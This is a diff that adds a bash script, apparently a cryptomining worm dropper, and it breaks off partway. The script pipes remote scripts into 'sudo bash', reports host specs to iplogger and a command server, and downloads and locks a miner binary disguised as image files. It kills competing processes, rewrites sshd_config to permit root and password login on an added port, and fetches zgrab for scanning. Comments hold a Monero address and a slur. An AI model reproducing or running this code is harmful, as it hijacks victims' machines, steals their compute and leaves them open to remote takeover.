@@ -1,0 +1,662 @@
+#!/bin/bash
+#thanks for everything
+#                                                                     $$\    $$$$$$\
+#                                                                   $$$$ |  $$  __$$\
+# $$$$$$\   $$$$$$\   $$$$$$$\  $$$$$$\   $$$$$$$\        $$\   $$\ \_$$ |  \__/  $$ |
+#$$  __$$\ $$  __$$\ $$  _____|$$  __$$\ $$  _____|       \$$\ $$  |  $$ |   $$$$$$  |
+#$$ /  $$ |$$ /  $$ |\$$$$$$\  $$$$$$$$ |$$ /              \$$$$  /   $$ |  $$  ____/
+#$$ |  $$ |$$ |  $$ | \____$$\ $$   ____|$$ |              $$  $$<    $$ |  $$ |
+#\$$$$$$  |$$$$$$$  |$$$$$$$  |\$$$$$$$\ \$$$$$$$\        $$  /\$$\ $$$$$$\ $$$$$$$$\
+# \______/ $$  ____/ \_______/  \_______| \_______|$$$$$$\\__/  \__|\______|\________|
+#          $$ | pwning to pwn                      \______|
+#          $$ | if this script helped you make some $$ mining monero, throw a little my way?
+#          \__| Monero: 47TmDBB14HuY7xw55RqU27EfYyzfQGp6qKmfg6f445eihemFMn3xPhs8e1qM726pVj6XKtyQ1zqC24kqtv8fXkPZ7bvgSPU
+#
+#
+initializego() {
+	if test -f /tmp/.firstrun-update.pid; then
+		echo "pid exists, skip to next section"
+	else
+		curl -A xanthe-start/1.4 -sL http://xanthe.anondns.net:8080/files/fczyo | sudo bash -s >/dev/null 2>&1
+		echo "################################################fczyo DONE######################################################"
+		curl -A xanthe-start/1.4 -sL http://xanthe.anondns.net:8080/files/xesa.txt | sudo bash -s >/dev/null 2>&1
+		echo "################################################xesa DONE######################################################"
+		## Reporting in
+		PROC=`(nproc --all)`
+		MEM=`(free -h | gawk '/Mem:/{print $2}' | rev | cut -c 2- | rev | xargs printf "%.*f\n" 0)`
+		echo "p:$PROC, m:$MEM"
+		#https://iplogger.org/10xNq3
+		curl -A xanthecheck-$PROC.$MEM -sL https://iplogger.org/10xNq3 >/dev/null
+		curl -A xanthecheck-$PROC.$MEM -sL http://xanthe.anondns.net:8080/files/init >/dev/null
+		mkdir /tmp/
+		touch /tmp/.firstrun-update.pid
+		#chattr +ia /tmp/.firstrun.pid;
+	fi
+}
+
+filegetgo() {
+	if test -f /var/tmp/bbb/config.json; then
+		echo "config file exists"
+	else
+		echo "config file does not exist, downloading"
+		#curl -sL -o /tmp/eee http://xanthe.anondns.net:8080/files/lifxvf; chmod +x /tmp/eee ; /tmp/eee ; rm -rf /tmp/eee
+		curl -A filegetgo/1.5 --create-dirs -sL -o /var/tmp/bbb/config.json http://xanthe.anondns.net:8080/files/tcazmp.jpg
+		if md5sum --status -c - <<<"31776957b5be0f54c46f84bdac8544de /var/tmp/bbb/config.json"; then
+			echo "correct"
+		else
+			curl -A filegetgo/1.5 --create-dirs -sL -o /var/tmp/bbb/config.json http://34.82.205.130:8080/tcazmp.jpg
+			if md5sum --status -c - <<<"31776957b5be0f54c46f84bdac8544de /var/tmp/bbb/config.json"; then
+				echo "correct"
+			else
+				curl -A filegetgo/1.5 --create-dirs -sL -o /var/tmp/bbb/config.json http://165.22.48.169:8080/tcazmp.jpg
+				if md5sum --status -c - <<<"31776957b5be0f54c46f84bdac8544de /var/tmp/bbb/config.json"; then
+					echo "correct"
+				else
+					curl -A filegetgo/1.5 --create-dirs -sL -o /var/tmp/bbb/config.json http://xanthe.anondns.net:8080/files/tcazmp.jpg
+					if md5sum --status -c - <<<"31776957b5be0f54c46f84bdac8544de /var/tmp/bbb/config.json"; then
+						echo "correct"
+					else
+						curl -A filegetgo/1.5 --create-dirs -sL -o /var/tmp/bbb/config.json http://xanthe.anondns.net:8080/files/tcazmp.jpg
+						if md5sum --status -c - <<<"31776957b5be0f54c46f84bdac8544de /var/tmp/bbb/config.json"; then
+							echo "correct"
+						else
+							curl -A filegetgo/1.5 --create-dirs -sL -o /var/tmp/bbb/config.json http://xanthe.anondns.net:8080/files/config.json
+						fi
+					fi
+				fi
+			fi
+		fi
+	fi
+
+	#if test -f /var/tmp/bbb/bbb || test -f /tmp/bbb/bbb ; then
+	if test -f /var/tmp/bbb/bbb; then
+		echo "main bbb file exists"
+		if md5sum --status -c - <<<"9cd9f84a6f8d6e15bfaa0d7740ce59e6 /var/tmp/bbb/bbb"; then
+			echo "file CHECKSUM match"
+		else
+			echo "file exists but is not correct checksum, need to redownload"
+			#FIRST***** CHECH IF CURRENTLY DOWNLOADING if [ $? -eq 0 ]
+			ps aux | grep curl | grep -w /var/tmp/bbb/bbb | grep -v grep
+			if [ $? -eq 0 ]; then
+				echo "already downloading, Skip downloading"
+			else
+				echo "not currently downloading, starting download"
+				chattr -R -ia /var/tmp/bbb/
+				rm -rf /var/tmp/bbb/bbb
+				filegetgo
+			fi
+
+		fi
+	else
+		echo "bbb does not exist, downloading"
+		echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
+		chattr -R -iau /var/tmp || chattr -iau /tmp
+		sysctl -w vm.nr_hugepages="$(nproc --all)"
+		#mkdir -p /tmp/bbb;
+		#mkdir /var/tmp/bbb
+		urldirect1="http://xanthe.anondns.net:8080/files/"
+		urldirect2="http://34.82.205.130:8080/"
+		urldirect3="http://165.22.48.169:8080/"
+		urldirect4="https://up.nerde.pw/selif/"
+		urldirect5="https://junglecoder.com/linx/selif/"
+		urldirect6="https://so.urceco.de/selif/"
+		urldirect7="https://fs.ikl.sh/selif/"
+		urldirect8="https://share.dev0.sh/selif/"
+		urldirect9="http://uupload.ir/files/"
+		urlscrape1="https://anonfiles.com/"
+		urlscrape2="https://share-online.is/"
+		urlscrape3="https://myfile.is/"
+		urlscrape4="https://rapidshare.nu/"
+		urlscrape5="https://upload.st/"
+		urlscrape6="https://file.bz/"
+		urlscrape7="https://letsupload.cc/"
+		urlscrape8="https://fuskbugg.se/"
+		directarray1=("adnckil" "adnckil2")
+		#directarray2=("dE2dfsS3.jpg" "tcER5qnE.jpg")
+		directarray2=("adnckil" "adnckil2")
+		directarray3=("adnckil" "adnckil2")
+		#directarray3=("vh7jgqda.jpg" "51wqkrzf.jpg" "0y96i6r3.jpg" "92m68yn0.jpg" "oz8gffce.jpg" "xz9ver52.jpg" "vszyhtlo.jpg" "3vorlsof.jpg" "x464bmyh.jpg" "1wn5sjgi.jpg" "504xvir3.jpg" "qbhhx8jt.jpg" "4kc0x30m.jpg" "xo0czrnc.jpg" "e7bq6gov.jpg" "oay9zcom.jpg" "i8bo9g0e.jpg" "ar2h5i5i.jpg" "yeyii8sb.jpg" "rg991e3o.jpg")
+		directarray4=("28gqdic2.jpg" "463lt6o5.jpg" "2g1d19fy.jpg" "aknrg7b6.jpg" "ql5g92kw.jpg" "2ckzymod.jpg" "vfv30qum.jpg" "hnw1v0or.jpg" "fn79tf4y.jpg" "bmzwju5c.jpg" "t35bg5us.jpg" "1bm7lab3.jpg" "n6n63wm6.jpg" "b3dnupoz.jpg" "sfrjr8cj.jpg" "fjcj2hjd.jpg" "83f8ceph.jpg" "jlyd18zv.jpg" "o1ernrbu.jpg" "iiczqu1o.jpg")
+		directarray5=("a54v1t8v.file" "3tyfylw0.file" "qg2835kn.file" "1crd48rn.file" "4x6hq0nk.file" "63s2cl1n.file" "q5tj1q8q.file" "doli3rtr.file" "arbsqgno.file" "pll7l46n.file" "i0xrbsal.file" "x1tpgnc9.file" "5ukpoep5.file" "p3b913tz.file" "3qae42b7.file" "l1ytxkl1.file" "2y9kzh5v.file" "c6afohpe.file" "gwk77wyw.file" "fhthykey.file")
+		directarray6=("2rhw89y3.jpg" "roiuwr27.jpg" "gkq2f70v.jpg" "rfust8yv.jpg" "v3q4w0bf.jpg" "pckqx5vk.jpg" "0oso0g8x.jpg" "rsb3dtux.jpg" "9vghk7ox.jpg" "c4rlmoam.jpg" "97lycgks.jpg" "hljjrsq7.jpg" "d9bet2ek.jpg" "u6hrfpum.jpg" "few7oyax.jpg" "ip1gbtxq.jpg" "o5ud9ulk.jpg" "uoyidjbw.jpg" "4cw5r0qf.jpg" "eklup7oz.jpg")
+		directarray7=("ywtm4i58.jpg" "kr8fggiw.jpg" "pjgr3fc1.jpg" "oootb4z1.jpg" "6ny0ahyt.jpg" "3ju265c8.jpg" "95xn9b5g.jpg" "rrngmswt.jpg" "nzzayq5k.jpg" "gnea1g25.jpg" "f652awt0.jpg" "ir599zbt.jpg" "xx2xysot.jpg" "lbp90uda.jpg" "hyqje4iw.jpg" "c5mudh5x.jpg" "omt2cobn.jpg" "336yfadt.jpg" "ct4atkmb.jpg" "d24rt78d.jpg")
+		directarray8=("eha7jz9a.elf" "cy17gh5q.elf" "oqnbr34y.elf" "nudfxbjx.elf" "5qk7iklu.elf" "dquq70rd.elf" "gu58v9fk.elf" "1ui9zdxu.elf" "0kxjny09.elf" "s7njp6yw.elf" "787arv0d.elf" "eub16ghi.elf" "4yuldx99.elf" "o79d4luc.elf" "ev92sjev.elf" "viaqsrfj.elf" "k7xuw07a.elf" "81o5y14b.elf" "cirvsu8a.elf" "i4pxkpyj.elf")
+		directarray9=("pzab_bbp.jpg" "qk0y_bbp.jpg" "cfw2_bbp.jpg" "skb7_bbp.jpg")
+		scrapearray1=("TeG5Q1M4n4" "r6LcQbMbn3" "ddwcb4D8n3")
+		scrapearray3=("7befb8Dbnc" "p2fbb1D2nc" "f1g0b3Dana" "Z9g6bfD4n1" "P8h0b7D7n5" "Ffi9bbDcnd" "3bjeb6D3n9" "r7k8b8D6n3" "bfl4b2D1ne" "Nfl5bdD5nd" "51m2b4D0ne" "51n4b7D6ne" "d5oab4D0n4" "Vdoab8Den1" "L2pfb4Dcn6" "Fcq7b0Dfn5" "R6rcb1Dcn9" "J1tbb9Dana" "V6uabeD0nf" "f1web5D5ne")
+		scrapearray4=("9febb4D4n3" "rcf4bfDfne" "j6gcbdDcn0" "b8h6b8D9n0" "R9hebbD1n3" "H2i2b1D6n9" "53j9b5D4n5" "t5k4b9D4n1" "ffl9bbD5n5" "R0l9b0D2n9" "71m2b9D6n2" "7en3b5Dan2" "j2o8bbD4n0" "Xbodb0Dfn0" "P8p4bcDan1" "Haq4bfD4n8" "T4r2b2Ddnc" "N4t2b5Dbne" "XeudbeDfn3" "j1wfbcDan7")
+		scrapearray5=("B3e9b3D7nd" "tdfdbdD4n0" "lbgcbbD0n0" "d9hdb7D1n9" "T5hab0D2nb" "J4idb0Dbnf" "9ejabdD2n3" "v5k0b7D4nb" "h1l2b6Den8" "Tal1b5D3n3" "9fmab4Dbn5" "9fn1b0D1n6" "l8o2b1D5n2" "Z1o0b1D0n4" "R4pfbfD5n9" "Jbq2bbD3ne" "X4r4b2D7na" "P7t7bdDfn9" "Z0u5bcD4n1" "ldw4bfD0n6")
+		scrapearray6=("Dee7baDfn4" "v1f6b0D0nc" "n3gbbeDcnf" "fch2b6Den0" "b0i5b8Dan7" "Nbibb1D2nc" "B7j8b3Dana" "x8k6b1D6n6" "j0l6b1D4n7" "V2l2b5D2n3" "BamebdDcnc" "Bfn6b4D0n2" "n1o0beD1n4" "ddp2b8Dbne" "T6p3b7Danb" "N1qfb4D9n3" "Z1rcb8Dfne" "T2t5b5Dan4" "b3v6b4D3nb" "55w4bfD0n9")
+		scrapearray7=("F9e6bdD6na" "xefbbaDen2" "p3g6bdD4ne" "hbh6b5Den9" "d4i4bcD6n1" "Pbi0b2Dfnb" "Fej7b5Dcn7" "14k0bfD6nd" "n2l3beDfn0" "Xdldb5Dcnd" "FamabaDen5" "D3n9beD1n4" "pbo3bcDcn6" "fcpab2D8n9" "Vepeb2Dfn4" "Rbq9b2Dane" "b7scbdD7nd" "V5tcb3Ddn3" "dcveb4D8n9" "J1wcb6D9nf")
+		scrapearray8=("daJcp8Men0" "veJ1peM1n6")
+		#curl --create-dirs -sL -o /var/tmp/bbb/bbb $urldirect1${directarray1[$RANDOM % ${#directarray1[@]}]} || curl --create-dirs -sL -o /tmp/bbb/bbb $urldirect1${directarray1[$RANDOM % ${#directarray1[@]}]};
+		curl -A filegetgo/1.5 --create-dirs -sL -o /var/tmp/bbb/bbb $urldirect1${directarray1[$RANDOM % ${#directarray1[@]}]}
+		#if md5sum --status -c - <<<"9cd9f84a6f8d6e15bfaa0d7740ce59e6 /var/tmp/bbb/bbb" || md5sum --status -c - <<<"9cd9f84a6f8d6e15bfaa0d7740ce59e6 /tmp/bbb/bbb"
+		if md5sum --status -c - <<<"9cd9f84a6f8d6e15bfaa0d7740ce59e6 /var/tmp/bbb/bbb"; then
+			#chmod +x /var/tmp/bbb/bbb || chmod +x /tmp/bbb/bbb
+			chmod +x /var/tmp/bbb/bbb
+			chattr +ia /var/tmp/bbb/bbb
+			sysctl -w vm.nr_hugepages=$(nproc --all)
+			echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
+			#/var/tmp/bbb/bbb || /tmp/bbb/bbb
+			/var/tmp/bbb/bbb
+			sleep 10
+			chattr +ia /var/tmp/bbb/config.json
+			chmod 600 /var/tmp/bbb/log.log
+		else
+			curl -A filegetgo/1.5 --create-dirs -sL -o /var/tmp/bbb/bbb $urldirect2${directarray2[$RANDOM % ${#directarray2[@]}]}
+			if md5sum --status -c - <<<"9cd9f84a6f8d6e15bfaa0d7740ce59e6 /var/tmp/bbb/bbb"; then
+				chmod +x /var/tmp/bbb/bbb
+				chattr +ia /var/tmp/bbb/bbb
+				sysctl -w vm.nr_hugepages=$(nproc --all)
+				echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
+				/var/tmp/bbb/bbb
+				sleep 10
+				chattr +ia /var/tmp/bbb/config.json
+				chmod 600 /var/tmp/bbb/log.log
+			else
+				curl -A filegetgo/1.5 --create-dirs -sL -o /var/tmp/bbb/bbb $urldirect3${directarray3[$RANDOM % ${#directarray3[@]}]}
+				if md5sum --status -c - <<<"9cd9f84a6f8d6e15bfaa0d7740ce59e6 /var/tmp/bbb/bbb"; then
+					chmod +x /var/tmp/bbb/bbb
+					chattr +ia /var/tmp/bbb/bbb
+					sysctl -w vm.nr_hugepages=$(nproc --all)
+					echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
+					/var/tmp/bbb/bbb
+					sleep 10
+					chattr +ia /var/tmp/bbb/config.json
+					chmod 600 /var/tmp/bbb/log.log
+				else
+					rm -rf /var/tmp/bbb/bbb
+					echo "when the walls fell!!!! trying a re download"
+					sysctl -w vm.nr_hugepages=$(nproc --all)
+					echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
+					curl -A thewallsfell/1.0 --create-dirs -sL -o /var/tmp/bbb/config.json http://xanthe.anondns.net:8080/files/tcazmp.jpg
+					curl -A thewallsfell/1.0 --create-dirs -Lo /var/tmp/bbb/bbb http://165.22.48.169:8080/adnckil2
+					curl -A theworldisending/1.3 -sLo /dev/null https://iplogger.org/1Rfhy7
+					chmod +x /var/tmp/bbb/bbb
+					chattr +ia /var/tmp/bbb/bbb
+					/var/tmp/bbb/bbb
+					sleep 10
+					chattr +ia /var/tmp/bbb/config.json
+					chmod 600 /var/tmp/bbb/log.log
+				fi
+			fi
+		fi
+	fi
+}
+
+filesetupgo() {
+	#chattr -iauR /var/tmp/bbb/
+	mount | grep noexec | grep /tmp | grep -vw grep
+	if [ $? -eq 1 ]; then
+		echo "good to go - already running"
+	else
+		echo "remounting"
+		mount -o remount,exec /var/tmp
+		mount -o remount,exec /tmp
+	fi
+	j=0
+	for i in $(ps -fe | grep 'bbb' | grep -v grep | grep -v http | awk '{print $2}'); do
+		let j=j+1
+		if [ $j -ge 2 ]; then
+			echo "Killing process $i"
+			kill -9 $i
+		fi
+	done
+	ps -fe | grep -w bbb | grep -v grep | grep -v http
+	if [ $? -eq 0 ]; then
+		echo "RUNNING"
+		curl -A xanthe-running/1.2 -4sL https://iplogger.org/1iGce7 >/dev/null
+	else
+		echo "ERROR PROGRAM NOT RUNNING"
+		#mkdir -p /var/tmp/bbb
+		if md5sum --status -c - <<<"9cd9f84a6f8d6e15bfaa0d7740ce59e6 /var/tmp/bbb/bbb"; then
+			echo "file checksums match, proceed to relaunch"
+			filestartgo
+		else
+			echo "file checksums dont match...redownloading"
+			filegetgo
+		fi
+	fi
+}
+filestartgo() {
+
+	#mkdir /opt/bbb
+	#curl -A nigger/1.3 -Lo /opt/bbb/bbb http://138.68.14.52:8080/files/adnckil
+	#curl -A nigger/1.3 -Lo /opt/bbb/config.json http://138.68.14.52:8080/files/iqmjlf.jpg
+	#chmod +x /opt/bbb/bbb
+	chattr -ia /var/tmp/bbb/bbb
+	chmod +x /var/tmp/bbb/bbb
+	chattr +ia /var/tmp/bbb/bbb
+
+	chattr +ia /var/tmp/bbb/config.json
+	chattr +ia /var/tmp/bbb/config.json
+	chmod 600 /var/tmp/bbb/log.log
+
+	#chattr -iauR /tmp/bbb/
+	#chattr -iauR /opt/bbb/bbb
+	#curl -sL https://raw.githubusercontent.com/fengyouchao/pysocks/master/socks5.py  | python - start --port=5710 --log=false;
+	#ps aux | grep -vw bbb/bbb | grep -v grep | awk '{if($3>80.0) print $2}' | xargs -I % kill -9 %
+	#ps -fe | grep -w bbb/bbb | grep -v grep | grep -v http
+	ps aux | grep -vw /var/tmp/bbb/bbb | grep -v grep | awk '{if($3>80.0) print $2}' | xargs -I % kill -9 %
+	ps -fe | grep -w /var/tmp/bbb/bbb | grep -v grep | grep -v http
+	if [ $? -eq 0 ]; then
+		echo "RUNNING"
+	else
+		echo "Oops, not running.. lets get this party started!"
+		#sysctl -w vm.nr_hugepages=$(nproc --all)
+		#echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
+		#chmod +x /opt/bbb/bbb
+		#/opt/bbb/bbb
+		sysctl -w vm.nr_hugepages="$(nproc --all)"
+		echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
+		#chmod +x /var/tmp/bbb/bbb
+		/var/tmp/bbb/bbb
+		sleep 10s
+		ps -fe | grep -w /var/tmp/bbb/bbb | grep -v grep | grep -v http
+		if [ $? -eq 0 ]; then
+			echo "NOW RUNNING"
+		else
+			echo "Oh FUCK, Still not running, trying again!"
+			sysctl -w vm.nr_hugepages="$(nproc --all)"
+			echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
+			/var/tmp/bbb/bbb -c /var/tmp/bbb/config.json
+		fi
+	fi
+}
+
+#DEPRECIATED
+#filerungo(){
+##mkdir /opt/bbb
+#curl -A nigger/1.4 -Lo /var/tmp/bbb/bbb http://xanthe.anondns.net:8080/files/adnckil
+#curl -A nigger/1.4 -Lo /var/tmp/bbb/config.json http://xanthe.anondns.net:8080/files/iqmjlf.jpg
+#chmod +x /var/tmp/bbb/bbb
+#chattr -iauR /var/tmp/bbb/
+#chattr -iauR /var/tmp/bbb/bbb
+#curl -sL https://raw.githubusercontent.com/fengyouchao/pysocks/master/socks5.py  | python - start --port=5710 --log=false;
+#ps aux | grep -vw bbb/bbb | grep -v grep | awk '{if($3>80.0) print $2}' | xargs -I % kill -9 %
+#ps -fe | grep -w bbb/bbb | grep -v grep | grep -v http
+#if [ $? -eq 0 ]
+#then
+#echo "RUNNING"
+#else
+#sysctl -w vm.nr_hugepages="$(nproc --all)"
+#echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
+#chmod +x /var/tmp/bbb/bbb
+#/var/tmp/bbb/bbb
+#sleep 10s;
+#ps -fe | grep -w bbb/bbb | grep -v grep | grep -v http
+#if [ $? -eq 0 ]
+#then
+#echo "NOW RUNNING"
+#else
+#sysctl -w vm.nr_hugepages="$(nproc --all)"
+#echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
+#/var/tmp/bbb/bbb -c /var/tmp/bbb/config.json
+#fi
+#fi
+#}
+
+sshdconfig() {
+	chattr -ia /etc/ssh/sshd_config
+	chmod 644 /etc/ssh/sshd_config
+	echo "running sshd config"
+	#-e 's/PermitRootLogin yes/PermitRootLogin prohibit-password/g'
+	#echo "" >> /etc/ssh/sshd_config;
+	#echo "PermitRootLogin yes" >> /etc/ssh/sshd_config;
+	cat /etc/ssh/sshd_config | grep -iw "#Port 22" | grep -v grep >/dev/null
+	if [ $? -eq 0 ]; then
+		needreset=1
+		chattr -ia /etc/ssh/sshd_config
+		chmod 644 /etc/ssh/sshd_config
+		sed -i 's/#Port 22/Port 22/g' /etc/ssh/sshd_config
+		#chmod 644 /etc/ssh/sshd_config;
+		chattr +ia /etc/ssh/sshd_config
+	else
+		echo "blank response"
+	fi
+
+	cat /etc/ssh/sshd_config | grep -iw "Port 51360" | grep -v grep >/dev/null
+	if [ $? -eq 0 ]; then
+		echo "already exists"
+	else
+		echo "does not exist"
+		needreset=1
+		chattr -ia /etc/ssh/sshd_config
+		chmod 644 /etc/ssh/sshd_config
+		sed -i -e '$a\' /etc/ssh/sshd_config # This adds \n at the end of the file only if it doesn't already end with a new line. So if you run it twice it will not add another blank line.
+		echo "Port 51360" >>/etc/ssh/sshd_config
+		#chmod 644 /etc/ssh/sshd_config;
+		chattr +ia /etc/ssh/sshd_config
+	fi
+
+	cat /etc/ssh/sshd_config | grep -iw "PermitRootLogin" | grep -v grep >/dev/null
+	if [ $? -eq 0 ]; then
+		needreset=1
+		echo "PermitRootLogin line does exist"
+		chattr -ia /etc/ssh/sshd_config
+		chmod 644 /etc/ssh/sshd_config
+		#echo "" >> /etc/ssh/sshd_config;
+		echo "checking if PermitRootLogin disabled"
+		echo "PermitRootLogin yes" >>/etc/ssh/sshd_config
+		#sed -i '/.PermitRootLogin*/d' /etc/ssh/sshd_config;
+		sed -i -e 's/\#PermitRootLogin/PermitRootLogin/g' -e 's/\PermitRootLogin no/PermitRootLogin yes/g' -e 's/PermitRootLogin without-password/PermitRootLogin yes/g' -e 's/PermitRootLogin prohibit-password/PermitRootLogin yes/g' /etc/ssh/sshd_config
+		chmod 600 /etc/ssh/sshd_config
+		chattr +ia /etc/ssh/sshd_config
+		echo "successfully re-enabled PermitRootLogin"
+	else
+		echo "line does not exist at all, enter new line into file"
+		#echo "" >> /etc/ssh/sshd_config;
+		sed -i -e '$a\' /etc/ssh/sshd_config # This adds \n at the end of the file only if it doesn't already end with a new line. So if you run it twice it will not add another blank line.
+		echo "PermitRootLogin yes" >>/etc/ssh/sshd_config
+		needreset=1
+	fi
+
+	cat /etc/ssh/sshd_config | grep -iw "PasswordAuthentication" | grep -v grep >/dev/null
+	if [ $? -eq 0 ]; then
+		needreset=1
+		echo "PasswordAuthentication line does exist"
+		chattr -ia /etc/ssh/sshd_config
+		chmod 644 /etc/ssh/sshd_config
+		#echo "" >> /etc/ssh/sshd_config;
+		echo "checking if PasswordAuthentication disabled"
+		echo "PasswordAuthentication yes" >>/etc/ssh/sshd_config
+		#sed -i '/.PasswordAuthentication*/d' /etc/ssh/sshd_config;
+		sed -i -e 's/\#PasswordAuthentication/PasswordAuthentication/g' -e 's/\PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
+		chmod 600 /etc/ssh/sshd_config
+		chattr +ia /etc/ssh/sshd_config
+		echo "successfully re-enabled PasswordAuthentication"
+	else
+		echo "line does not exist at all, enter new line into file"
+		#echo "" >> /etc/ssh/sshd_config;
+		sed -i -e '$a\' /etc/ssh/sshd_config # This adds \n at the end of the file only if it doesn't already end with a new line. So if you run it twice it will not add another blank line.
+		echo "PasswordAuthentication yes" >>/etc/ssh/sshd_config
+		needreset=1
+	fi
+
+	cat /etc/ssh/sshd_config | grep -iw "GSSAPIAuthentication" | grep -v grep >/dev/null
+	if [ $? -eq 0 ]; then
+		needreset=1
+		echo "PubkeyAuthentication line does exist"
+		chattr -ia /etc/ssh/sshd_config
+		chmod 644 /etc/ssh/sshd_config
+		#echo "" >> /etc/ssh/sshd_config;
+		echo "checking if PubkeyAuthentication disabled"
+		sed -i -e 's/\#PubkeyAuthentication/PubkeyAuthentication/g' -e 's/\PubkeyAuthentication no/PubkeyAuthentication yes/g' /etc/ssh/sshd_config
+		chmod 600 /etc/ssh/sshd_config
+		chattr +ia /etc/ssh/sshd_config
+		echo "successfully re-enabled PubkeyAuthentication"
+	else
+		echo "line does not exist at all, enter new line into file"
+		echo "" >>/etc/ssh/sshd_config
+		echo "PubkeyAuthentication yes" >>/etc/ssh/sshd_config
+		needreset=1
+	fi
+
+	cat /etc/ssh/sshd_config | grep -iw "GSSAPIAuthentication" | grep -v grep >/dev/null
+	if [ $? -eq 0 ]; then
+		needreset=1
+		echo "GSSAPIAuthentication line does exist"
+		chattr -ia /etc/ssh/sshd_config
+		chmod 644 /etc/ssh/sshd_config
+		#echo "" >> /etc/ssh/sshd_config;
+		echo "checking if GSSAPIAuthentication enabled"
+		sed -i -e 's/GSSAPIAuthentication yes/GSSAPIAuthentication no/g' /etc/ssh/sshd_config
+		chmod 600 /etc/ssh/sshd_config
+		chattr +ia /etc/ssh/sshd_config
+		echo "successfully DISABLED GSSAPIAuthentication"
+	else
+		echo "line does not exist at all, enter new line into file"
+		echo "" >>/etc/ssh/sshd_config
+		echo "GSSAPIAuthentication yes" >>/etc/ssh/sshd_config
+		needreset=1
+	fi
+
+	cat /etc/ssh/sshd_config | grep -iw "GSSAPICleanupCredentials" | grep -v grep >/dev/null
+	if [ $? -eq 0 ]; then
+		needreset=1
+		echo "GSSAPICleanupCredentials line does exist"
+		chattr -ia /etc/ssh/sshd_config
+		chmod 644 /etc/ssh/sshd_config
+		#echo "" >> /etc/ssh/sshd_config;
+		echo "checking if GSSAPICleanupCredentials enabled"
+		sed -i -e 's/GSSAPICleanupCredentials yes/GSSAPICleanupCredentials no/g' /etc/ssh/sshd_config
+		chmod 600 /etc/ssh/sshd_config
+		chattr +ia /etc/ssh/sshd_config
+		echo "successfully DISABLED GSSAPICleanupCredentials"
+	else
+		echo "line does not exist at all, enter new line into file"
+		echo "" >>/etc/ssh/sshd_config
+		echo "GSSAPICleanupCredentials yes" >>/etc/ssh/sshd_config
+		needreset=1
+	fi
+	chmod 600 /etc/ssh/sshd_config
+	chattr +ia /etc/ssh/sshd_config
+	echo "sshd config done"
+}
+
+resetsshgo() {
+	if [ "$needreset" -eq "0" ]; then
+		echo "no need"
+	else
+		sleep 10
+		/etc/init.d/ssh restart
+		/etc/init.d/sshd restart
+		/etc/rc.d/sshd restart
+		service ssh restart
+		service sshd restart
+		systemctl start ssh
+		systemctl restart ssh
+		scw-fetch-ssh-keys --upgrade
+	fi
+}
+
+scancheck() {
+	echo "scan check started"
+	PROC=`(nproc --all)`
+	MEM=`(free -h | gawk '/Mem:/{print $2}' | rev | cut -c 2- | rev | xargs printf "%.*f\n" 0)`
+	echo "p:$PROC, m:$MEM"
+	#check if cores > 1 and do not scan if only single core
+	scanlimit=2
+	if [ "$PROC" -lt "$scanlimit" ]; then
+		echo "less than 2 cores, dont start scanning yet"
+	else
+		echo "greater than 2 cores, START SCANNING!"
+		scango
+	fi
+
+}
+
+scango() {
+	dpkg --configure -a
+	screen -wipe >/dev/null
+	ps aux | grep "dmS cock" | grep -vw grep >/dev/null
+	if [ $? -eq 0 ]; then
+		echo "running"
+	else
+		echo "need to start"
+		pkill screen
+		cat /etc/os-release | grep -vw grep | grep "rhel" >/dev/null
+		if [ $? -eq 0 ]; then
+			yum remove epel-release -y
+			rpm -ivh https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm
+			rpm -ivh https://dl.fedoraproject.org/pub/epel/epel-release-latest-8.noarch.rpm
+		else
+			echo "no need"
+		fi
+		if md5sum --status -c - <<<"83acf5a32d84330bbb0103f2169e10bb /usr/bin/zgrab"; then
+			echo ""
+		else
+			zgrabz1="http://uupload.ir/files/"
+			zgrabz2="https://s.put.re/"
+			zgrabscrape1="https://fuskbugg.se/"
+			zgrabzar1=("epjn_zgrab.jpg" "4ih_zgrab.jpg" "kfdd_zgrab.jpg" "k4l8_zgrab.jpg")
+			zgrabzar2=("1ghKpDSA.jpg" "1mR8WfJd.jpg" "1qUqWBMx.jpg" "2XmTPE5G.jpg" "38FqoSBL.jpg" "8BqzUEE8.jpg" "dqY7fmbn.jpg" "fjY69WMZ.jpg" "GWj4vteM.jpg" "Hb4Km7TL.jpg" "j8X4Zzc7.jpg" "Lgj775pY.jpg" "ML5Jj2F6.jpg" "RARm5CMk.jpg" "SFcKoguW.jpg" "sv5evTRR.jpg" "twuY28Nv.jpg" "Va8Ah4wR.jpg" "Wmm44FfX.jpg" "Yj5dX3uk.jpg")
+			zgrabscrapear1=("1fRfidDen8" "39R6idD9n7" "52Rbi5D7ne" "BcR3ibDen0")
+			chattr -iua /usr/bin/zgrab
+			curl -L -o /usr/bin/zgrab $zgrabz1${zgrabzar1[$RANDOM % ${#zgrabzar1[@]}]} || curl -sKL -o /usr/bin/zgrab $zgrabz2${zgrabzar2[$RANDOM % ${#zgrabzar2[@]}]}
+			chmod +x /usr/bin/zgrab
+		fi
+		if md5sum --status -c - <<<"83acf5a32d84330bbb0103f2169e10bb /usr/bin/zgrab"; then
+			echo ""
+		else
+			zgrabz1="http://uupload.ir/files/"
+			zgrabz2="https://s.put.re/"
+			zgrabscrape1="https://fuskbugg.se/"
+			zgrabzar1=("epjn_zgrab.jpg" "4ih_zgrab.jpg" "kfdd_zgrab.jpg" "k4l8_zgrab.jpg")
+			zgrabzar2=("1ghKpDSA.jpg" "1mR8WfJd.jpg" "1qUqWBMx.jpg" "2XmTPE5G.jpg" "38FqoSBL.jpg" "8BqzUEE8.jpg" "dqY7fmbn.jpg" "fjY69WMZ.jpg" "GWj4vteM.jpg" "Hb4Km7TL.jpg" "j8X4Zzc7.jpg" "Lgj775pY.jpg" "ML5Jj2F6.jpg" "RARm5CMk.jpg" "SFcKoguW.jpg" "sv5evTRR.jpg" "twuY28Nv.jpg" "Va8Ah4wR.jpg" "Wmm44FfX.jpg" "Yj5dX3uk.jpg")
